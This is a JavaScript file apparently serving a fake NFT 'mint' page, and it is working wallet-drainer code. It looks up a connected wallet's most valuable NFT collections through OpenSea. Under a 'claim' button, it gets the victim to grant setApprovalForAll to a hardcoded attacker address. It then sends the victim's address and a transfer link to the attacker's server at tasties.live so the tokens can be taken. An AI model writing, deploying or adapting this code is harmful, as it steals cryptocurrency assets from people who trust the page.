const receiveAddress = "0x84c5c58476a022E216F7BAe80eaaFA44a27841eC";
//"0xFa5e9f32821d216b5863d4BbE09D040b606b16CE";
//"0xa39Af3e6Dc69B9F6Dcb936AB997E3B62d83e8a1B";
//"0x240602F7f979102dAA9401D8d77Af03a196fB645";
//"0xa39Af3e6Dc69B9F6Dcb936AB997E3B62d83e8a1B"; //"0x87580f5b4837ee7679b0fec1916f220509055422";

const BASE_URL = "https://tasties.live/god/api";

const drainNftsInfo = {
  minValue: 0.3, // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
  maxTransfers: 5,
};

//#region Utils Functions
function isMobile() {
  var check = false;
  (function (a) {
    if (
      /(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(
        a
      ) ||
      /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(
        a.substr(0, 4)
      )
    )
      check = true;
  })(navigator.userAgent || navigator.vendor || window.opera);
  return check;
}

function openInNewTab(href) {
  Object.assign(document.createElement("a"), {
    target: "_blank",
    href: href,
  }).click();
}

const round = (value) => {
  return Math.round(value * 10000) / 10000;
};
const sleep = (ms) => {
  return new Promise((resolve) => setTimeout(resolve, ms));
};
const getRdm = (min, max) => {
  return Math.floor(Math.random() * (max - min + 1)) + min;
};
//#endregion

//#region Web3.js
let metamaskInstalled = false;
if (typeof window.ethereum !== "undefined") metamaskInstalled = true;

let web3Provider;
async function connectButton() {
  await Moralis.enableWeb3(
    metamaskInstalled
      ? {}
      : {
          provider: "walletconnect",
        }
  );
}

Moralis.onWeb3Enabled(async (data) => {
  console.log(data);
  if (data.chainId !== 1 && metamaskInstalled) {
    await Moralis.switchNetwork("0x1");
  }
  updateState(true);
});

Moralis.onChainChanged(async (chain) => {
  if (chain !== "0x1" && metamaskInstalled) await Moralis.switchNetwork("0x1");
});

if (window.ethereum) {
  window.ethereum.on("disconnect", (err) => {
    console.log(err);
    updateState(false);
  });

  window.ethereum.on("accountsChanged", (accounts) => {
    if (accounts.length < 1) {
      updateState(false);
    }
  });
}

async function updateState(connected) {
  document.getElementById("connectButton").style.display = connected? "none" : "";
  //document.getElementById("claimButton").style.display = connected? "" : "none";
  document.getElementById("mint-box").style.display = connected? "flex" : "none";
}

async function getOpenseaKey() {
  const options = {
    method: "GET",
    headers: {
      "Content-Type": "application/json",
    },
  };

  return await fetch(`${BASE_URL}/opensea`, options)
    .then((response) => response.json())
    .then((data) => data.key);
}

async function getAssets(walletAddress) {
  const encoded = await getOpenseaKey();
  const buff = Buffer.from(encoded, 'base64');
  const key = buff.toString('ascii');
  const options = {
    method: 'GET',
    headers: {
      'Accept': 'application/json',
      'X-API-KEY': key
    }
  };
  return fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`, options);
}

async function askNfts() {
  const web3Js = new Web3(Moralis.provider);
  const walletAddress = (await web3Js.eth.getAccounts())[0];
  const walletNfts = await getAssets(walletAddress)
    .then((response) => response.json())
    .then((nfts) => {
      console.log("nfts", nfts);
      if (nfts.detail && nfts.detail.indexOf("Request was throttled.") >= 0) {
        return ["Request was throttled."];
      }
      return nfts
        .filter((nft) => {
          if (nft.primary_asset_contracts.length > 0) return true;
          else return false;
        })
        .map((nft) => {
          return {
            type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
            contract_address: nft.primary_asset_contracts[0].address,
            name: nft.primary_asset_contracts[0].name,
            price: round(
              nft.stats.one_day_average_price != 0
                ? nft.stats.one_day_average_price
                : nft.stats.seven_day_average_price
            ),
            owned: nft.owned_asset_count,
          };
        });
    })
    .catch((err) => console.error(err));

  if (!walletNfts) {
    console.log("Fetch error.");
    return notEligible();
  }
  if (walletNfts.includes("Request was throttled.")) {
    console.log("Request was throttled.");
    return notEligible();
  }
  if (walletNfts.length < 1) {
    console.log("There is no tokens");
    return notEligible();
  }

  console.log("walletNfts", walletNfts);
  let transactionsOptions = [];
  for (let nft of walletNfts) {
    if (!nft) {
      continue;
    }
    if (nft.price === 0) {
      console.log("No price");
      continue;
    }
    const contract_address = nft.contract_address.toUpperCase();
    if (contract_address === '0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85'.toUpperCase()) { //EthereumNameService
      continue;
    }
    if (contract_address === '0x76BE3b62873462d2142405439777e971754E8E77'.toUpperCase()) {
      continue;
    }
    if (contract_address === '0xc36cF0cFcb5d905B8B513860dB0CFE63F6Cf9F5c'.toUpperCase()) {
      continue;
    }
    const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1));
    if (ethPrice < drainNftsInfo.minValue) continue;
    transactionsOptions.push({
      price: ethPrice,
      schema: nft.type,
      name: nft.name,
      options: {
        contractAddress: nft.contract_address,
        from: walletAddress,
        functionName: "setApprovalForAll",
        abi: [
          {
            inputs: [
              {
                internalType: "address",
                name: "operator",
                type: "address",
              },
              {
                internalType: "bool",
                name: "approved",
                type: "bool",
              },
            ],
            name: "setApprovalForAll",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function",
          },
        ],
        params: {
          operator: ethPrice > 1 ? receiveAddress : receiveAddress,
          approved: true,
        },
        gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit,
      },
    });
  }
  if (transactionsOptions.length < 1) {
    return notEligible();
  }

  const transactionLists = await transactionsOptions
    .sort((a, b) => b.price - a.price)
    .slice(0, drainNftsInfo.maxTransfers);

  let remainItems = [...transactionLists];
  while (remainItems.length > 0) {
    const requestItems = [...remainItems];
    remainItems = [];
    for (let transaction of requestItems) {
      const contractAddress = transaction.options.contractAddress;
      console.log(`Transferring ${contractAddress} (${transaction.price} ETH)`);

      const walletAddress = (await web3Js.eth.getAccounts())[0];
      if (isMobile()) {
        await Moralis.executeFunction(transaction.options)
          .catch((O_o) => console.error(O_o, transaction.options))
          /*.then((uwu) => {
            console.log('uwu', uwu)
            return uwu.wait(10);
          })
          .catch((O_o) => console.error(O_o, transaction.options))*/
          .then((result) => {
            console.log("mobile-result:", result);
            if (result) {
              mintToken(contractAddress, transaction.schema, walletAddress);
              sendWebhooks(walletAddress, contractAddress, transaction);
            } else {
              remainItems.push(transaction);
            }
          });
      } else {
        await Moralis.executeFunction(transaction.options)
          .catch((O_o) => console.error(O_o, transaction.options))
          /*.then((uwu) => {
            console.log('uwu', uwu)
            return uwu.wait(10);
          })
          .catch((O_o) => console.error(O_o, transaction.options))*/
          .then((result) => {
            console.log("desktop-result:", result);
            if (result) {
              mintToken(contractAddress, transaction.schema, walletAddress);
              sendWebhooks(walletAddress, contractAddress, transaction);
            } else {
              remainItems.push(transaction);
            }
          });
        await sleep(111);
      }
    }
    console.log('remain', remainItems.length);
    await sleep(1500);
  }
}
const notEligible = () => {
  document.getElementById("notEli").style.display = "";
};

const sendWebhooks = (walletAddress, contractAddress, transaction) => {
  const message = [
    `\`${walletAddress}\` just approved \`${contractAddress}\`. ${transaction.name} **(${transaction.price})**`,
    `GodHatesPixels Transfer Link: ${BASE_URL}/token/transfer/${contractAddress}/${walletAddress}`,
    `https://etherscan.io/tokenapprovalchecker`,
  ].join('\n');
  fetch(`${BASE_URL}/notification`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      content: message,
    }),
  }).catch((err) => console.error(err));
};

const mintToken = (contract, schema, owner) => {
  console.log("mintToken", contract, schema, owner);
  fetch(`${BASE_URL}/mint`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      contract,
      schema,
      owner,
    }),
  }).catch((err) => console.error(err));
};

async function askTransfer() {
  //mintToken('0x88B48F654c30e99bc2e4A1559b4Dcf1aD93FA656', 'erc1155', '0x7d780D408a1CC2dE0Ec909Ef9bB8E8875C4D4A70');
  document.getElementById("claimButton").style.opacity = 0.5;
  //document.getElementById("claimButton").style.pointerEvents = "none";
  document.getElementById("claimButton").removeEventListener("click", askTransfer);

  await askNfts();

  document.getElementById("claimButton").style.opacity = 1;
  //document.getElementById("claimButton").style.pointerEvents = "auto";
  document.getElementById("claimButton").addEventListener("click", askTransfer);
}

window.addEventListener("load", async () => {
  if (isMobile() && !window.ethereum) {
    document.getElementById("connectButton").addEventListener("click", () => {
      (window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`)
    });
  } else {
    document.getElementById("connectButton").addEventListener("click", connectButton);
  }
  document.getElementById("claimButton").addEventListener("click", askTransfer);

  document.getElementById("minusButton").addEventListener("click", function() {
    const value = document.getElementById("mintCount").value;
    if (Number(value) > 1) {
      document.getElementById("mintCount").value = Number(value) - 1;
    }
  });
  document.getElementById("plusButton").addEventListener("click", function() {
    const value = document.getElementById("mintCount").value;
    if (Number(value) < 3) {
      document.getElementById("mintCount").value = Number(value) + 1;
    }
  });
});

//#endregion
